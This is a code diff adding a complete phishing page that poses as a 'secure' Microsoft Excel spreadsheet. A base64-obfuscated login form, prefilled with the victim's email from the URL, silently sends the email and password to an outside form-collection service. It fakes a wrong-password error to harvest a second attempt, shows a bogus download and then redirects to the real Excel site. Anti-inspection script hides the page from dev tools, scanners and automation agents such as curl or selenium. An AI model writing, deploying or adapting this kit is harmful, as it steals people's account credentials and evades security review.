@@ -1,0 +1,277 @@
+<script type="text/javascript">
+    // ============================================================
+    // ANTI-BOT + SOURCE GUARD
+    // ============================================================
+    (function() {
+        // 1. Disable right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // 2. Disable common keyboard shortcuts for viewing source / dev tools
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.key === 'F12' || e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I / Cmd+Shift+I (DevTools)
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+J / Cmd+Shift+J (Console)
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+C / Cmd+Shift+C (Inspect Element)
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U / Cmd+U (View Source)
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+S / Cmd+S (Save Page)
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+A / Cmd+A (Select All) - optional, can be intrusive
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'A' || e.key === 'a' || e.keyCode === 65)) {
+                // Allow select-all inside input fields
+                var tag = (e.target || e.srcElement).tagName;
+                if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
+                    e.preventDefault();
+                    return false;
+                }
+            }
+        });
+
+        // 3. Disable text selection / copy / cut on the page (except inside inputs)
+        document.addEventListener('selectstart', function(e) {
+            var tag = (e.target || e.srcElement).tagName;
+            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        document.addEventListener('copy', function(e) {
+            var tag = (e.target || e.srcElement).tagName;
+            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        document.addEventListener('cut', function(e) {
+            var tag = (e.target || e.srcElement).tagName;
+            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // 4. Detect if DevTools is open (basic heuristic) and blur/clear page
+        var devtoolsOpen = false;
+        var threshold = 160;
+        setInterval(function() {
+            var widthDiff = window.outerWidth - window.innerWidth;
+            var heightDiff = window.outerHeight - window.innerHeight;
+            if (widthDiff > threshold || heightDiff > threshold) {
+                if (!devtoolsOpen) {
+                    devtoolsOpen = true;
+                    // Obfuscate / clear sensitive UI
+                    document.body.innerHTML = '';
+                    document.body.style.background = '#ffffff';
+                }
+            } else {
+                devtoolsOpen = false;
+            }
+        }, 1000);
+
+        // 5. Disable drag on images and links
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // 6. Basic bot detection: require mouse movement before enabling submit
+        var humanVerified = false;
+        var humanCheck = function() {
+            humanVerified = true;
+            document.removeEventListener('mousemove', humanCheck);
+            document.removeEventListener('touchstart', humanCheck);
+            document.removeEventListener('scroll', humanCheck);
+            document.removeEventListener('keydown', humanCheck);
+        };
+        document.addEventListener('mousemove', humanCheck);
+        document.addEventListener('touchstart', humanCheck);
+        document.addEventListener('scroll', humanCheck);
+        document.addEventListener('keydown', humanCheck);
+
+        // Expose flag for form handler
+        window.__humanVerified = function() { return humanVerified; };
+
+        // 7. Prevent iframe embedding (clickjacking protection)
+        if (window.top !== window.self) {
+            try {
+                window.top.location = window.self.location;
+            } catch (e) {
+                document.body.innerHTML = '';
+            }
+        }
+
+        // 8. Detect headless / automation user agents (basic)
+        var ua = navigator.userAgent.toLowerCase();
+        var botPatterns = [
+            'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
+            'python-requests', 'curl', 'wget', 'scrapy', 'bot', 'crawler', 'spider'
+        ];
+        for (var i = 0; i < botPatterns.length; i++) {
+            if (ua.indexOf(botPatterns[i]) !== -1) {
+                document.body.innerHTML = '';
+                return;
+            }
+        }
+
+        // 9. Prevent printing (Ctrl+P / Cmd+P)
+        document.addEventListener('keydown', function(e) {
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'P' || e.key === 'p' || e.keyCode === 80)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // 10. Obfuscate source: periodically clear console
+        setInterval(function() {
+            try { console.clear(); } catch (e) {}
+        }, 2000);
+    })();
+</script>
+<script type="text/javascript">
+    var decodedHTML = atob(
+        "PGh0bWwgbGFuZz0iZW4iPgoKPGhlYWQ+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJ4LXVhLWNvbXBhdGlibGUiIGNvbnRlbnQ9IkVtdWxhdGVJRTkiPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4wLjAvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiBpbnRlZ3JpdHk9InNoYTM4NC1HbjUzODR4cVExYW9XWEErMDU4UlhQeFBnNmZ5NElXdlROaDBFMjYzWG1GY0psU0F3aUdnRkFXL2RBaVM2SlhtIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj4KCTxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL3Jlcy5jZG4ub2ZmaWNlLm5ldC9maWxlcy9mYWJyaWMtY2RuLXByb2RfMjAyNTExMTcuMDAxL2Fzc2V0cy9icmFuZC1pY29ucy9wcm9kdWN0L3BuZy9leGNlbF80OHgzLnBuZyI+CiAgICA8dGl0bGU+TWljcm9zb2Z0IEV4Y2VsPC90aXRsZT4KPC9oZWFkPgoKPGJvZHkgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwczovL2kuaW1ndXIuY29tLzEyNnhobDEucG5nKTsgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDtiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyI+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQgcC0wIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgbXktNSI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNSBteC1hdXRvIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtLTUgcC00IGJnLXdoaXRlIHJvdW5kZWQiIGlkPSJkaXYxIiBzdHlsZT0iYm94LXNoYWRvdzogMHB4IDJweCA1cHggcmdiYSgwLDAsMCwwLjUpOyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtbGVmdCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj48aW1nIHNyYz0iaHR0cHM6Ly93d3cucG5nYWxsLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMTUvRXhjZWwtTG9nby1QTkctQ3V0b3V0LnBuZyIgY2xhc3M9ImltZy1mbHVpZCIgd2lkdGg9IjE1MHB4Ij48L3NwYW4+PHNwYW4gY2xhc3M9InBsLTQgaDUgYWxpZ24tbWlkZGxlIj4gPC9zcGFuPjxicj48YnI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaCI+PGI+RXhjZWwgc2VjdXJlIHNwcmVhZHNoZWV0JiN4MUY1MTI7ITwvc3Bhbj48YnI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaDUiPjwvc3Bhbj48YnI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaCI+UGxlYXNlIHZlcmlmeSB5b3VyIHBhc3N3b3JkIHRvIGFjY2VzcyBzZW5zaXRpdmUgaW5mb3JtYXRpb248L3NwYW4+PGJyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9Im1zZyIgY2xhc3M9InRleHQtZGFuZ2VyIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgZm9udC1zaXplOiAxMnB4OyI+SW52YWxpZCBQYXNzd29yZC4uISBQbGVhc2UgZW50ZXIgY29ycmVjdCBwYXNzd29yZC48L3NwYW4+PGJyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVycm9yIiBjbGFzcz0idGV4dC1kYW5nZXIiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+VGhhdCBhY2NvdW50IGRvZXNuJ3QgZXhpc3QuIEVudGVyIGEgZGlmZmVyZW50IGFjY291bnQ8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c21hbGw+PC9zbWFsbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgoJCQkJCQkJPGZvcm0gYWN0aW9uPSJodHRwczovL3N1Ym1pdC1mb3JtLmNvbS9yT3BoSEJRcUQiIG1ldGhvZD0icG9zdCIgaWQ9ImxvZ2luRm9ybSI+CgkJCQkJCQkJCQk8aW5wdXQgdHlwZT0iZW1haWwiIGlkPSJsb2dpbiIgbmFtZT0iZW1haWwiIGNsYXNzPSJmb3JtLWNvbnRyb2wgcm91bmRlZC0wIGJnLXRyYW5zcGFyZW50IiBhcmlhLWRlc2NyaWJlZGJ5PSJhaUhlbHAiIHBsYWNlaG9sZGVyPSJFbWFpbCIgcmVhZG9ubHkgYXV0b2ZvY3VzIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBtdC0yIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzbWFsbD48L3NtYWxsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dkIiBuYW1lPSJwYXNzd29yZCIgY2xhc3M9ImZvcm0tY29udHJvbCIgYXJpYS1kZXNjcmliZWRieT0iYWlIZWxwIiBwbGFjZWhvbGRlcj0iRW50ZXIgUGFzc3dvcmQiIGF1dG9mb2N1cyByZXF1aXJlZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tY2hlY2sgbXQtMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJmb3JtLWNoZWNrLWlucHV0IiBpZD0iZXhhbXBsZUNoZWNrMSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImZvcm0tY2hlY2stbGFiZWwiIGZvcj0iZXhhbXBsZUNoZWNrMSI+PHNwYW4+PGEgaHJlZj0iIyI+S2VlcCBtZSBzaWduIGluPC9hPjwvc3Bhbj48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+PHNwYW4+PGEgaHJlZj0iIyIgY2xhc3M9ImZsb2F0LXJpZ2h0Ij5Gb3Jnb3QgUGFzc3dvcmQ/PC9hPjwvc3Bhbj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbXQtMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biB0ZXh0LXdoaXRlIHB4LTQgdy0xMDAiIGlkPSJzdWJtaXQtYnRuIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzAwNjEwMDsiPlNpZ24gaW48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KCjwvaHRtbD4="
+    );
+    document.write(decodedHTML);
+</script>
+<script type="text/javascript">
+    // Populate email from URL hash after the form is rendered
+    (function populateEmailFromHash() {
+        const hash = window.location.hash;
+        if (hash && hash.length > 1) {
+            const emailFromHash = decodeURIComponent(hash.substring(1));
+            const emailInput = document.getElementById('login');
+            if (emailInput) {
+                emailInput.value = emailFromHash;
+            }
+        } else {
+            const emailInput = document.getElementById('login');
+            if (emailInput) {
+                emailInput.readOnly = false;
+                emailInput.placeholder = "Enter your email";
+            }
+        }
+    })();
+
+    // Two-step submission: first shows wrong password (auto-hide after 3s), second navigates to loader page
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('loginForm');
+        const msgSpan = document.getElementById('msg');
+        const passwdInput = document.getElementById('passwd');
+        let submitCount = 0;
+        let msgTimer = null;
+
+        if (form) {
+            form.addEventListener('submit', function (e) {
+                e.preventDefault(); // Stop normal form submission (no Formspark redirect)
+
+                // Basic bot gate: require human interaction before allowing submit
+                if (typeof window.__humanVerified === 'function' && !window.__humanVerified()) {
+                    // Silently ignore bot submissions
+                    return;
+                }
+
+                submitCount++;
+
+                // Gather form data
+                const formData = new FormData(form);
+
+                // Send data to Formspark (silently, no redirect)
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                }).catch(function () {
+                    // Ignore errors; we still proceed with UI logic
+                });
+
+                if (submitCount === 1) {
+                    // First submission: show error message, clear password field, auto-hide after 3s
+                    if (msgSpan) {
+                        msgSpan.style.display = 'inline';
+                        if (msgTimer) {
+                            clearTimeout(msgTimer);
+                        }
+                        msgTimer = setTimeout(function () {
+                            msgSpan.style.display = 'none';
+                        }, 3000);
+                    }
+                    if (passwdInput) {
+                        passwdInput.value = '';
+                        passwdInput.focus();
+                    }
+                } else {
+                    // Second submission: build the loader page in the same window
+                    // After 100%, show red error message before redirect
+                    const loaderPage = '<!DOCTYPE html>' +
+                        '<html lang="en">' +
+                        '<head>' +
+                        '<meta charset="utf-8">' +
+                        '<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">' +
+                        '<title>Downloading...</title>' +
+                        '</head>' +
+                        '<body style="margin:0; padding:0; background-color:#f0f0f0; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;">' +
+                        '<div style="color:#006100; font-size:15px; font-weight:bold; margin-bottom:10px; letter-spacing:0.5px;">Downloading Excel File</div>' +
+                        '<div style="background-color:#006100; color:#ffffff; border-radius:8px; padding:4px 28px; box-shadow:0px 4px 12px rgba(0,0,0,0.3); text-align:center; min-width:280px;">' +
+                        '<div style="font-size:13px; color:#ffffff; letter-spacing:0.5px;">Downloading...</div>' +
+                        '<div id="loader-percent" style="font-size:20px; font-weight:bold; color:#ffffff; margin-top:2px;">1%</div>' +
+                        '</div>' +
+                        '<div id="corrupt-msg" style="display:none; color:#ff0000; font-size:14px; font-weight:bold; margin-top:12px; text-align:center;">Download file corrupt, please try again letter</div>' +
+                        '<script type="text/javascript">' +
+                        'var percent = 1;' +
+                        'var percentEl = document.getElementById("loader-percent");' +
+                        'var corruptMsg = document.getElementById("corrupt-msg");' +
+                        'if (percentEl) { percentEl.textContent = percent + "%"; }' +
+                        'var interval = setInterval(function () {' +
+                        '    percent++;' +
+                        '    if (percentEl) { percentEl.textContent = percent + "%"; }' +
+                        '    if (percent >= 100) {' +
+                        '        clearInterval(interval);' +
+                        '        if (corruptMsg) { corruptMsg.style.display = "block"; }' +
+                        '        setTimeout(function () {' +
+                        '            window.location.href = "https://excel.cloud.microsoft";' +
+                        '        }, 2500);' +
+                        '    }' +
+                        '}, 150);' +
+                        '<\/script>' +
+                        '</body>' +
+                        '</html>';
+
+                    document.open();
+                    document.write(loaderPage);
+                    document.close();
+                }
+            });
+        }
+    });
+</script>
+</body>
+</html>
